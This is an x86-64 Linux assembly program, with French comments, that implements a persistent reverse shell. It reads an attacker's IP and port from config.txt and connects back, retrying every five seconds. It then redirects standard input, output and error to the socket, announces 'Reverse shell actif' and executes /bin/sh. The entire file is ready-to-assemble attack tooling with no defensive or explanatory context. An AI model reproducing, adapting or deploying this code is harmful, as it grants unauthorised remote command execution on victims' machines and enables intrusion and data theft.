section .bss
config_buffer resb 32
ip_buffer     resb 16
port_buffer   resb 6

section .data
config_path: db "config.txt", 0
shellpath: db "/bin/sh", 0

sockaddr:
    dw 2
    dw 0
    dd 0
    dq 0

banner: db 10, 27, "[32m[*] Reverse shell actif. Bienvenue !", 10, 27, "[0m", 10
banner_len equ $ - banner

timespec_5s:
    dq 5
    dq 0

section .text
global _start

_start:
    ; === open("config.txt", O_RDONLY) ===
    mov     rax, 2
    lea     rdi, [rel config_path]
    xor     rsi, rsi
    syscall
    test    rax, rax
    js      .exit
    mov     r13, rax

    ; === read(fd, config_buffer, 32) ===
    mov     rax, 0
    mov     rdi, r13
    lea     rsi, [rel config_buffer]
    mov     rdx, 32
    syscall

    ; === close(fd) ===
    mov     rax, 3
    mov     rdi, r13
    syscall

    ; === parser IP ===
    lea     rsi, [rel config_buffer]
    lea     rdi, [rel ip_buffer]
    xor     rcx, rcx
.parse_ip_loop:
    mov     al, byte [rsi + rcx]
    cmp     al, ':'
    je      .done_ip
    mov     byte [rdi + rcx], al
    inc     rcx
    jmp     .parse_ip_loop
.done_ip:
    mov     byte [ip_buffer + rcx], 0
    inc     rcx

    ; === parser Port ===
    lea     rdi, [rel port_buffer]
    xor     rdx, rdx
.parse_port_loop:
    mov     al, byte [rsi + rcx]
    cmp     al, 10
    je      .done_port
    mov     byte [rdi + rdx], al
    inc     rcx
    inc     rdx
    jmp     .parse_port_loop
.done_port:
    mov     byte [port_buffer + rdx], 0

    ; === convert port ===
    xor     rbx, rbx
    xor     rcx, rcx
.convert_port_loop:
    movzx   rax, byte [port_buffer + rcx]
    cmp     rax, 0
    je      .convert_port_done
    sub     rax, '0'
    imul    rbx, rbx, 10
    add     rbx, rax
    inc     rcx
    cmp     rcx, 5
    jl      .convert_port_loop
.convert_port_done:
    mov     ax, bx
    xchg    al, ah
    mov     word [sockaddr + 2], ax

    ; === convert IP ===
    lea     rsi, [rel ip_buffer]
    lea     rdi, [rel sockaddr + 4]
    xor     rcx, rcx
    xor     rdx, rdx
.parse_octet:
    xor     rbx, rbx
.parse_loop:
    movzx   rax, byte [rsi + rcx]
    cmp     rax, '.'
    je      .write_octet
    cmp     rax, 0
    je      .write_octet
    sub     rax, '0'
    imul    rbx, rbx, 10
    add     rbx, rax
    inc     rcx
    jmp     .parse_loop
.write_octet:
    mov     byte [rdi + rdx], bl
    inc     rcx
    inc     rdx
    cmp     rdx, 4
    jl      .parse_octet

.retry_connection:
    ; === socket(AF_INET, SOCK_STREAM, 0) ===
    mov     rax, 41
    mov     rdi, 2
    mov     rsi, 1
    xor     rdx, rdx
    syscall
    mov     r12, rax

    ; === connect(socket, sockaddr*, 16) ===
    mov     rax, 42
    mov     rdi, r12
    lea     rsi, [rel sockaddr]
    mov     rdx, 16
    syscall
    test    rax, rax
    js      .wait_retry

.success_connection:
    ; === dup2(socket, 0, 1, 2) ===
    mov     rsi, 2
.dup_loop:
    mov     rax, 33
    mov     rdi, r12
    mov     rdx, rsi
    syscall
    dec     rsi
    jns     .dup_loop

    ; === bannière ===
    mov     rax, 1
    mov     rdi, r12
    lea     rsi, [rel banner]
    mov     rdx, banner_len
    syscall

    ; === execve("/bin/sh", NULL, NULL) ===
    mov     rax, 59
    lea     rdi, [rel shellpath]
    xor     rsi, rsi
    xor     rdx, rdx
    syscall

.exit:
    mov     rax, 60
    xor     rdi, rdi
    syscall

.wait_retry:
    mov     rax, 35
    lea     rdi, [rel timespec_5s]
    xor     rsi, rsi
    syscall
    jmp .retry_connection
